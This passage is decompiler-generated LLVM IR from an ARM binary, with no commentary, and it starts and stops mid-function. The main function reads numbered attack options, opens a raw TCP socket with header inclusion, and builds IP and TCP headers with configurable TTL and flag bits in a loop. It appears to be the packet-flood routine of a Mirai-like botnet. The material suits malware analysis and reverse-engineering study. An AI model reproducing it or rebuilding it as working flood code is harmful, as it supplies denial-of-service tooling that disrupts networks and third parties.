  %v1_c6b0 = load i32, i32* @r4, align 4
  %v9_c6b0 = icmp eq i32 %v6_c094, %v1_c6b0
  store i1 %v9_c6b0, i1* %cpsr_z.global-to-local, align 1
  %v1_c6b4 = load i32, i32* @r6, align 4
  %v2_c6b4 = add i32 %v1_c6b4, 4
  %v3_c6b4 = inttoptr i32 %v2_c6b4 to i32*
  store i32 %v0_c6a8, i32* %v3_c6b4, align 4
  br i1 %v9_c6b0, label %dec_label_pc_c6bc, label %dec_label_pc_c510

dec_label_pc_c6bc:                                ; preds = %dec_label_pc_c6a8, %dec_label_pc_c504
  %v0_c6bc = call i32 @function_fe60()
  store i32 %v1_c164, i32* %r3.global-to-local, align 4
  store i1 %v2_c6c4, i1* %cpsr_z.global-to-local, align 1
  %v1_c6c8 = load i32, i32* @r6, align 4
  %v2_c6c8 = add i32 %v1_c6c8, 8
  %v3_c6c8 = inttoptr i32 %v2_c6c8 to i32*
  store i32 %v0_c6bc, i32* %v3_c6c8, align 4
  br i1 %v2_c6c4, label %dec_label_pc_c51c, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c510, %dec_label_pc_c6bc
  %v0_c6d0 = load i32, i32* @r5, align 4
  %v1_c6d0 = add i32 %v0_c6d0, 40
  store i32 %v6_c13c, i32* @r1, align 4
  %v1_c6d8 = inttoptr i32 %v1_c6d0 to i8*
  %v2_c6d8 = call i32 @function_1003c(i8* %v1_c6d8)
  br label %dec_label_pc_c51c

dec_label_pc_c6e0:                                ; preds = %dec_label_pc_c1c4
  store i32 %v6_c13c, i32* %r3.global-to-local, align 4
  %v1_c6e8 = add i32 %v6_c13c, 40
  store i32 %v1_c6e8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c474.preheader

; uselistorder directives
  uselistorder i32 %v1_c6e8, { 1, 0 }
  uselistorder i32 %v4_c694, { 1, 0 }
  uselistorder i32 %v2_c624, { 1, 0 }
  uselistorder i32 %v3_c5f4, { 1, 0 }
  uselistorder i32 %v3_c5d0, { 2, 3, 1, 0 }
  uselistorder i32 %v0_c5b0, { 1, 2, 0 }
  uselistorder i32 %v1_c5ac, { 2, 0, 3, 1 }
  uselistorder i32 %v0_c53c, { 1, 0, 2 }
  uselistorder i32 %v0_c480, { 2, 0, 1 }
  uselistorder i32 %v0_c474, { 1, 0 }
  uselistorder i1 %v2_c6c4, { 2, 3, 1, 0 }
  uselistorder i1 %v3_c648, { 1, 0, 2, 3 }
  uselistorder i32 %v1_c45c, { 1, 0, 2, 3 }
  uselistorder i8 %v5_c2c0, { 1, 0 }
  uselistorder i32 %v1_c288, { 1, 0 }
  uselistorder i32 %v1_c284, { 1, 0 }
  uselistorder i32 %v1_c280, { 1, 0 }
  uselistorder i32 %v1_c25c, { 1, 0 }
  uselistorder i32 %v1_c258, { 1, 0 }
  uselistorder i32 %v1_c254, { 1, 0 }
  uselistorder i32 %v1_c248, { 1, 0 }
  uselistorder i32 %v1_c224, { 1, 0 }
  uselistorder i32 %v1_c214, { 1, 0 }
  uselistorder i32 %v1_c200, { 2, 1, 0 }
  uselistorder i32 %v0_c1e0, { 1, 0, 2 }
  uselistorder i32 %v3_c1d4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_c1c8, { 3, 0, 1, 2 }
  uselistorder i32 %v0_c1c4, { 0, 2, 1, 3 }
  uselistorder i1 %v7_c1bc, { 1, 0 }
  uselistorder i1 %v7_c190, { 1, 0 }
  uselistorder i32 %v3_c18c, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v6_c178, { 4, 3, 0, 5, 1, 2 }
  uselistorder i32 %v1_c164, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_c13c, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32 %v6_c094, { 3, 2, 1, 0 }
  uselistorder i32 %v5_c078, { 2, 5, 4, 3, 1, 0 }
  uselistorder i32 %v1_c028, { 1, 0 }
  uselistorder i32 %v6_bfc0, { 1, 0 }
  uselistorder i32 %v2_bfa8, { 0, 3, 1, 2 }
  uselistorder i32 %v1_bf8c, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 18, 19, 20, 21, 22, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 36, 34, 35, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 38, 37, 39, 10, 11, 12, 14, 13, 16, 15, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 8, 9, 10 }
  uselistorder label %dec_label_pc_c6d0, { 1, 0 }
  uselistorder label %dec_label_pc_c5c8, { 1, 0 }
  uselistorder label %dec_label_pc_c51c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c474.preheader, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c6fc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c6fc:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_c6fc = load i32, i32* @r4, align 4
  %v12_c6fc = load i32, i32* @r7, align 4
  %v1_c700 = urem i32 %arg1, 256
  store i32 %v1_c700, i32* @sl, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %v1_c700, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_c718 = urem i32 %arg3, 256
  store i32 %v1_c718, i32* @r4, align 4
  %v2_c71c = call i32 @function_14294(i32 %v1_c700, i32 4)
  %v0_c720 = load i32, i32* @r5, align 4
  store i32 %v0_c720, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c71c, i32* %fp.global-to-local, align 4
  %v0_c730 = load i32, i32* @r4, align 4
  store i32 %v0_c730, i32* %r0.global-to-local, align 4
  %v4_c734 = inttoptr i32 %v0_c720 to i32*
  %v5_c734 = call i32 @function_a4e8(i32 %v0_c730, i32* %v4_c734, i32 2, i32 0)
  %v1_c740 = urem i32 %v5_c734, 256
  store i32 %v1_c740, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c74c = load i32, i32* @r5, align 4
  store i32 %v0_c74c, i32* %r1.global-to-local, align 4
  %v0_c750 = load i32, i32* @r4, align 4
  store i32 %v0_c750, i32* %r0.global-to-local, align 4
  %v5_c754 = trunc i32 %v5_c734 to i8
  %v6_c758 = inttoptr i32 %v0_c74c to i32*
  %v7_c758 = call i32 @function_a4e8(i32 %v0_c750, i32* %v6_c758, i32 3, i32 65535)
  %v0_c75c = load i32, i32* @r5, align 4
  store i32 %v0_c75c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c76c = load i32, i32* @r4, align 4
  store i32 %v0_c76c, i32* %r0.global-to-local, align 4
  %v5_c770 = inttoptr i32 %v0_c75c to i32*
  %v6_c770 = call i32 @function_a4e8(i32 %v0_c76c, i32* %v5_c770, i32 4, i32 64)
  %v1_c778 = urem i32 %v6_c770, 256
  store i32 %v1_c778, i32* %ip.global-to-local, align 4
  %v0_c77c = load i32, i32* @r5, align 4
  store i32 %v0_c77c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c788 = load i32, i32* @r4, align 4
  store i32 %v0_c788, i32* %r0.global-to-local, align 4
  %v6_c790 = inttoptr i32 %v0_c77c to i32*
  %v7_c790 = call i32 @function_a4e8(i32 %v0_c788, i32* %v6_c790, i32 5, i32 1)
  %v1_c79c = urem i32 %v7_c790, 256
  store i32 %v1_c79c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c7a8 = load i32, i32* @r5, align 4
  store i32 %v0_c7a8, i32* %r1.global-to-local, align 4
  %v0_c7ac = load i32, i32* @r4, align 4
  store i32 %v0_c7ac, i32* %r0.global-to-local, align 4
  %v5_c7b4 = inttoptr i32 %v0_c7a8 to i32*
  %v6_c7b4 = call i32 @function_a4e8(i32 %v0_c7ac, i32* %v5_c7b4, i32 6, i32 65535)
  %v0_c7bc = load i32, i32* @r5, align 4
  store i32 %v0_c7bc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_c7b4, i32* @r7, align 4
  %v0_c7cc = load i32, i32* @r4, align 4
  store i32 %v0_c7cc, i32* %r0.global-to-local, align 4
  %v4_c7d0 = inttoptr i32 %v0_c7bc to i32*
  %v5_c7d0 = call i32 @function_a4e8(i32 %v0_c7cc, i32* %v4_c7d0, i32 7, i32 65535)
  %v0_c7d8 = load i32, i32* @r5, align 4
  store i32 %v0_c7d8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_c7d0, i32* @r6, align 4
  %v0_c7e8 = load i32, i32* @r4, align 4
  store i32 %v0_c7e8, i32* %r0.global-to-local, align 4
  %v4_c7ec = inttoptr i32 %v0_c7d8 to i32*
  %v5_c7ec = call i32 @function_a4e8(i32 %v0_c7e8, i32* %v4_c7ec, i32 17, i32 65535)
  %v0_c7f0 = load i32, i32* @r5, align 4
  store i32 %v0_c7f0, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c800 = load i32, i32* @r4, align 4
  store i32 %v0_c800, i32* %r0.global-to-local, align 4
  %v5_c804 = inttoptr i32 %v0_c7f0 to i32*
  %v6_c804 = call i32 @function_a4e8(i32 %v0_c800, i32* %v5_c804, i32 18, i32 0)
  %v0_c808 = load i32, i32* @r5, align 4
  store i32 %v0_c808, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c818 = load i32, i32* @r4, align 4
  store i32 %v0_c818, i32* %r0.global-to-local, align 4
  %v5_c81c = inttoptr i32 %v0_c808 to i32*
  %v6_c81c = call i32 @function_a4e8(i32 %v0_c818, i32* %v5_c81c, i32 11, i32 0)
  %v0_c820 = load i32, i32* @r5, align 4
  store i32 %v0_c820, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c830 = load i32, i32* @r4, align 4
  store i32 %v0_c830, i32* %r0.global-to-local, align 4
  %v5_c834 = inttoptr i32 %v0_c820 to i32*
  %v6_c834 = call i32 @function_a4e8(i32 %v0_c830, i32* %v5_c834, i32 12, i32 0)
  %v0_c838 = load i32, i32* @r5, align 4
  store i32 %v0_c838, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c848 = load i32, i32* @r4, align 4
  store i32 %v0_c848, i32* %r0.global-to-local, align 4
  %v5_c84c = inttoptr i32 %v0_c838 to i32*
  %v6_c84c = call i32 @function_a4e8(i32 %v0_c848, i32* %v5_c84c, i32 13, i32 0)
  %v0_c850 = load i32, i32* @r5, align 4
  store i32 %v0_c850, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c860 = load i32, i32* @r4, align 4
  store i32 %v0_c860, i32* %r0.global-to-local, align 4
  %v5_c864 = inttoptr i32 %v0_c850 to i32*
  %v6_c864 = call i32 @function_a4e8(i32 %v0_c860, i32* %v5_c864, i32 14, i32 0)
  %v0_c868 = load i32, i32* @r5, align 4
  store i32 %v0_c868, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c878 = load i32, i32* @r4, align 4
  store i32 %v0_c878, i32* %r0.global-to-local, align 4
  %v5_c87c = inttoptr i32 %v0_c868 to i32*
  %v6_c87c = call i32 @function_a4e8(i32 %v0_c878, i32* %v5_c87c, i32 15, i32 1)
  %v0_c880 = load i32, i32* @r5, align 4
  store i32 %v0_c880, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c890 = load i32, i32* @r4, align 4
  store i32 %v0_c890, i32* %r0.global-to-local, align 4
  %v5_c894 = inttoptr i32 %v0_c880 to i32*
  %v6_c894 = call i32 @function_a4e8(i32 %v0_c890, i32* %v5_c894, i32 16, i32 0)
  %v2_c8a0 = load i32, i32* @global_var_1ecb8.86, align 4
  store i32 %v2_c8a0, i32* %r3.global-to-local, align 4
  %v0_c8a4 = load i32, i32* @r5, align 4
  store i32 %v0_c8a4, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_c8ac = load i32, i32* @r4, align 4
  store i32 %v0_c8ac, i32* %r0.global-to-local, align 4
  %v5_c8b0 = inttoptr i32 %v0_c8a4 to i32*
  %v6_c8b0 = call i32 @function_a47c(i32 %v0_c8ac, i32* %v5_c8b0, i32 25, i32 %v2_c8a0, i32 %v6_c894)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c8c4 = call i32 @function_13f90(i32 2, i32 3, i32 6)
  store i32 %v3_c8c4, i32* %r0.global-to-local, align 4
  %v7_c8c8 = icmp eq i32 %v3_c8c4, -1
  store i1 %v7_c8c8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c8c4, i32* %sb.global-to-local, align 4
  br i1 %v7_c8c8, label %dec_label_pc_ce34, label %dec_label_pc_c8d4

dec_label_pc_c8d4:                                ; preds = %dec_label_pc_c6fc
  store i32 1, i32* %stack_var_-40, align 4
  %v6_c8dc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_c8dc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_c8f0 = call i32 @function_13f60(i32 %v3_c8c4, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_c8f0, i32* %r0.global-to-local, align 4
  %v7_c8f4 = icmp eq i32 %v6_c8f0, -1
  store i1 %v7_c8f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c8f4, label %dec_label_pc_ce2c, label %dec_label_pc_c8fc

dec_label_pc_c8fc:                                ; preds = %dec_label_pc_c8d4
  store i32 0, i32* %stack_var_-40, align 4
  %v0_c910 = load i32, i32* @r7, align 4
  %v3_c910 = mul i32 %v0_c910, 65536
  store i32 %v3_c910, i32* %r4.global-to-local, align 4
  %v0_c914 = load i32, i32* @r6, align 4
  %v3_c918 = urem i32 %v7_c758, 65536
  store i32 %v3_c918, i32* %r3.global-to-local, align 4
  %v3_c91c = urem i32 %v0_c910, 65536
  store i32 %v3_c91c, i32* %ip.global-to-local, align 4
  %v3_c920 = urem i32 %v0_c914, 65536
  store i32 %v3_c920, i32* %r0.global-to-local, align 4
  %v1_c924 = urem i32 %v6_c81c, 256
  store i32 %v1_c924, i32* %r2.global-to-local, align 4
  %v0_c928 = load i32, i32* @sl, align 4
  %v2_c928 = icmp eq i32 %v0_c928, 0
  store i1 %v2_c928, i1* %cpsr_z.global-to-local, align 1
  %tmp69 = icmp slt i32 %v0_c928, 1
  br i1 %tmp69, label %dec_label_pc_cbd8, label %dec_label_pc_c940

dec_label_pc_c940:                                ; preds = %dec_label_pc_c8fc
  %v1_c950 = urem i32 %v0_c910, 256
  %v1_c958 = urem i32 %v7_c758, 256
  %v1_c95c = urem i32 %v0_c914, 256
  %tmp70 = mul i32 %v5_c7ec, 256
  %v3_c964 = mul nuw nsw i32 %v1_c95c, 256
  %v1_c968 = and i32 %tmp70, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  %tmp71 = udiv i32 %v0_c914, 256
  %v4_c96c = urem i32 %tmp71, 256
  %v5_c96c = or i32 %v4_c96c, %v3_c964
  store i32 %v5_c96c, i32* @r6, align 4
  %tmp72 = udiv i32 %v5_c7ec, 256
  %v4_c970 = urem i32 %tmp72, 256
  %v5_c970 = or i32 %v4_c970, %v1_c968
  store i32 %v5_c970, i32* @r5, align 4
  %v3_c97c = mul nuw nsw i32 %v1_c958, 256
  %v1_c980 = urem i32 %v6_c81c, 2
  %tmp73 = udiv i32 %v7_c758, 256
  %v4_c984 = urem i32 %tmp73, 256
  %v5_c984 = or i32 %v4_c984, %v3_c97c
  store i32 %v5_c984, i32* @lr, align 4
  %v1_c988 = urem i32 %v6_c834, 2
  %v3_c998 = mul nuw nsw i32 %v1_c950, 256
  store i32 %v3_c998, i32* %r1.global-to-local, align 4
  %tmp74 = udiv i32 %v0_c910, 256
  %v4_c9a4 = urem i32 %tmp74, 256
  %v5_c9a4 = or i32 %v4_c9a4, %v3_c998
  store i32 %v5_c9a4, i32* @r7, align 4
  %v1_c9a8 = urem i32 %v6_c84c, 2
  %v1_c9ac = urem i32 %v6_c864, 2
  %v1_c9b0 = urem i32 %v6_c87c, 2
  %v1_c9c0 = urem i32 %v6_c894, 2
  store i32 %v1_c9c0, i32* %r0.global-to-local, align 4
  store i32 %v1_c958, i32* %r2.global-to-local, align 4
  store i32 %v1_c950, i32* %r3.global-to-local, align 4
  store i32 %v1_c95c, i32* %ip.global-to-local, align 4
  %v5_c9d0 = trunc i32 %tmp73 to i8
  %v5_c9e0 = trunc i32 %v0_c914 to i8
  store i32 0, i32* @r4, align 4
  %sext = mul i32 %v6_c770, 16777216
  %v4_ca30 = sdiv i32 %sext, 16777216
  %sext8 = mul i32 %v7_c758, 16777216
  %v4_ca48 = sdiv i32 %sext8, 16777216
  %tmp = sub nsw i32 0, %v1_c980
  %v4_caa4 = and i32 %tmp, 32
  %tmp78 = sub nsw i32 0, %v1_c988
  %v4_cab8 = and i32 %tmp78, 16
  %tmp79 = sub nsw i32 0, %v1_c9a8
  %v4_cacc = and i32 %tmp79, 8
  %tmp80 = sub nsw i32 0, %v1_c9ac
  %v4_cae0 = and i32 %tmp80, 4
  %tmp81 = sub nsw i32 0, %v1_c9b0
  %v3_caf4 = and i32 %tmp81, 2
  %v7_cb24 = sext i8 %v5_c9e0 to i32
  %sext77 = mul i32 %v0_c910, 16777216
  %v3_cb24 = sdiv i32 %sext77, 16777216
  br label %dec_label_pc_c9e8

dec_label_pc_c9e8:                                ; preds = %bb76, %dec_label_pc_c940
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_c9f0 = call i32 @function_14294(i32 128, i32 1)
  store i32 %v2_c9f0, i32* %r0.global-to-local, align 4
  %v3_c9f4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c9f4, i32* %r2.global-to-local, align 4
  %v1_c9f8 = load i32, i32* %fp.global-to-local, align 4
  %v2_c9f8 = load i32, i32* @r4, align 4
  %v5_c9f8 = mul i32 %v2_c9f8, 4
  %v6_c9f8 = add i32 %v5_c9f8, %v1_c9f8
  %v7_c9f8 = inttoptr i32 %v6_c9f8 to i32*
  store i32 %v2_c9f0, i32* %v7_c9f8, align 4
  %v0_c9fc = load i32, i32* %fp.global-to-local, align 4
  %v1_c9fc = load i32, i32* %r2.global-to-local, align 4
  %v4_c9fc = mul i32 %v1_c9fc, 4
  %v5_c9fc = add i32 %v4_c9fc, %v0_c9fc
  %v6_c9fc = inttoptr i32 %v5_c9fc to i32*
  %v7_c9fc = load i32, i32* %v6_c9fc, align 4
  store i32 %v7_c9fc, i32* %r4.global-to-local, align 4
  %v1_ca00 = inttoptr i32 %v7_c9fc to i8*
  %v2_ca00 = load i8, i8* %v1_ca00, align 1
  %tmp82 = urem i8 %v2_ca00, 16
  %v1_ca04 = zext i8 %tmp82 to i32
  %v1_ca08 = or i32 %v1_ca04, 64
  store i32 %v1_ca08, i32* %r3.global-to-local, align 4
  %v1_ca0c = trunc i32 %v1_ca08 to i8
  store i8 %v1_ca0c, i8* %v1_ca00, align 1
  %v0_ca10 = load i32, i32* %r4.global-to-local, align 4
  %v1_ca10 = inttoptr i32 %v0_ca10 to i8*
  %v2_ca10 = load i8, i8* %v1_ca10, align 1
  %v1_ca14 = and i8 %v2_ca10, -16
  %v1_ca18 = or i8 %v1_ca14, 5
  store i32 %v1_c79c, i32* %r0.global-to-local, align 4
  store i8 %v1_ca18, i8* %v1_ca10, align 1
  %v2_ca28 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca28 = add i32 %v2_ca28, 1
  %v4_ca28 = inttoptr i32 %v3_ca28 to i8*
  store i8 %v5_c754, i8* %v4_ca28, align 1
  store i32 %v4_ca30, i32* %r2.global-to-local, align 4
  %v2_ca34 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca34 = add i32 %v2_ca34, 4
  %v4_ca34 = inttoptr i32 %v3_ca34 to i8*
  store i8 %v5_c9d0, i8* %v4_ca34, align 1
  store i32 6, i32* %ip.global-to-local, align 4
  %v0_ca40 = load i32, i32* %r0.global-to-local, align 4
  %v2_ca40 = icmp eq i32 %v0_ca40, 0
  store i1 %v2_ca40, i1* %cpsr_z.global-to-local, align 1
  %v2_ca44 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca44 = add i32 %v2_ca44, 3
  %v4_ca44 = inttoptr i32 %v3_ca44 to i8*
  store i8 60, i8* %v4_ca44, align 1
  store i32 %v4_ca48, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ca50 = load i32, i32* %r2.global-to-local, align 4
  %v1_ca50 = trunc i32 %v0_ca50 to i8
  %v2_ca50 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca50 = add i32 %v2_ca50, 8
  %v4_ca50 = inttoptr i32 %v3_ca50 to i8*
  store i8 %v1_ca50, i8* %v4_ca50, align 1
  %v0_ca54 = load i32, i32* %ip.global-to-local, align 4
  %v1_ca54 = trunc i32 %v0_ca54 to i8
  %v2_ca54 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca54 = add i32 %v2_ca54, 9
  %v4_ca54 = inttoptr i32 %v3_ca54 to i8*
  store i8 %v1_ca54, i8* %v4_ca54, align 1
  %v0_ca58 = load i32, i32* %r3.global-to-local, align 4
  %v1_ca58 = trunc i32 %v0_ca58 to i8
  %v2_ca58 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca58 = add i32 %v2_ca58, 2
  %v4_ca58 = inttoptr i32 %v3_ca58 to i8*
  store i8 %v1_ca58, i8* %v4_ca58, align 1
  %v3_ca5c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ca5c, i32* %r2.global-to-local, align 4
  %v0_ca60 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ca60, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_c9e8
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_ca64 = load i32, i32* %r4.global-to-local, align 4
  %v4_ca64 = add i32 %v3_ca64, 6
  %v5_ca64 = inttoptr i32 %v4_ca64 to i8*
  store i8 64, i8* %v5_ca64, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c9e8, %bb
  %v0_ca68 = load i32, i32* %r0.global-to-local, align 4
  %v1_ca68 = trunc i32 %v0_ca68 to i8
  %v2_ca68 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca68 = add i32 %v2_ca68, 5
  %v4_ca68 = inttoptr i32 %v3_ca68 to i8*
  store i8 %v1_ca68, i8* %v4_ca68, align 1
  %v0_ca6c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ca6c, label %.thread9, label %bb75

.thread9:                                         ; preds = %.thread
  store i32 %v6_c8b0, i32* %r0.global-to-local, align 4
  br label %bb76

bb75:                                             ; preds = %.thread
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v6_c8b0, i32* %r0.global-to-local, align 4
  %v3_ca74 = load i32, i32* %r4.global-to-local, align 4
  %v4_ca74 = add i32 %v3_ca74, 7
  %v5_ca74 = inttoptr i32 %v4_ca74 to i8*
  store i8 0, i8* %v5_ca74, align 1
  %v0_ca7c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb76

bb76:                                             ; preds = %.thread9, %bb75
  %v0_ca7c = phi i32 [ %v6_c8b0, %.thread9 ], [ %v0_ca7c.pre, %bb75 ]
  %v0_ca78 = load i32, i32* %r2.global-to-local, align 4
  %v3_ca78 = mul i32 %v0_ca78, 32
  store i32 %v3_ca78, i32* %r3.global-to-local, align 4
  %v1_ca7c = load i32, i32* %r4.global-to-local, align 4
  %v2_ca7c = add i32 %v1_ca7c, 12
  %v3_ca7c = inttoptr i32 %v2_ca7c to i32*
  store i32 %v0_ca7c, i32* %v3_ca7c, align 4
  %v0_ca80 = load i32, i32* %r3.global-to-local, align 4
  %v1_ca80 = load i32, i32* %r2.global-to-local, align 4
  %tmp83 = mul i32 %v1_ca80, -8
  %v5_ca80 = add i32 %v0_ca80, %tmp83
  %v1_ca84 = load i32, i32* @r8, align 4
  %v2_ca84 = add i32 %v1_ca84, %v5_ca80
  store i32 %v2_ca84, i32* %r3.global-to-local, align 4
  %v1_ca88 = add i32 %v2_ca84, 16
  %v2_ca88 = inttoptr i32 %v1_ca88 to i32*
  %v3_ca88 = load i32, i32* %v2_ca88, align 4
  store i32 %v3_ca88, i32* %r2.global-to-local, align 4
  %v0_ca8c = load i32, i32* @r7, align 4
  %v1_ca8c = trunc i32 %v0_ca8c to i8
  %v2_ca8c = load i32, i32* %r4.global-to-local, align 4
  %v3_ca8c = add i32 %v2_ca8c, 20
  %v4_ca8c = inttoptr i32 %v3_ca8c to i8*
  store i8 %v1_ca8c, i8* %v4_ca8c, align 1
  %v0_ca90 = load i32, i32* %r2.global-to-local, align 4
  %v1_ca90 = load i32, i32* %r4.global-to-local, align 4
  %v2_ca90 = add i32 %v1_ca90, 16
  %v3_ca90 = inttoptr i32 %v2_ca90 to i32*
  store i32 %v0_ca90, i32* %v3_ca90, align 4
  %v0_ca94 = load i32, i32* %r4.global-to-local, align 4
  %v1_ca94 = add i32 %v0_ca94, 20
  store i32 %v1_ca94, i32* %r1.global-to-local, align 4
  %v1_ca98 = add i32 %v0_ca94, 33
  %v2_ca98 = inttoptr i32 %v1_ca98 to i8*
  %v3_ca98 = load i8, i8* %v2_ca98, align 1
  %v4_ca98 = zext i8 %v3_ca98 to i32
  store i32 %v1_c980, i32* %r2.global-to-local, align 4
  %v1_caa0 = and i32 %v4_ca98, 223
  %v5_caa4 = or i32 %v1_caa0, %v4_caa4
  store i32 %v5_caa4, i32* %r3.global-to-local, align 4
  %v1_caa8 = trunc i32 %v5_caa4 to i8
  store i8 %v1_caa8, i8* %v2_ca98, align 1
  %v0_caac = load i32, i32* %r1.global-to-local, align 4
  %v1_caac = add i32 %v0_caac, 13
  %v2_caac = inttoptr i32 %v1_caac to i8*
  %v3_caac = load i8, i8* %v2_caac, align 1
  %v4_caac = zext i8 %v3_caac to i32
  store i32 %v1_c988, i32* %r3.global-to-local, align 4
  %v1_cab4 = and i32 %v4_caac, 239
  %v5_cab8 = or i32 %v1_cab4, %v4_cab8
  store i32 %v5_cab8, i32* %r2.global-to-local, align 4
  %v1_cabc = trunc i32 %v5_cab8 to i8
  store i8 %v1_cabc, i8* %v2_caac, align 1
  %v0_cac0 = load i32, i32* %r1.global-to-local, align 4
  %v1_cac0 = add i32 %v0_cac0, 13
  %v2_cac0 = inttoptr i32 %v1_cac0 to i8*
  %v3_cac0 = load i8, i8* %v2_cac0, align 1
  %v4_cac0 = zext i8 %v3_cac0 to i32
  store i32 %v1_c9a8, i32* %ip.global-to-local, align 4
  %v1_cac8 = and i32 %v4_cac0, 247
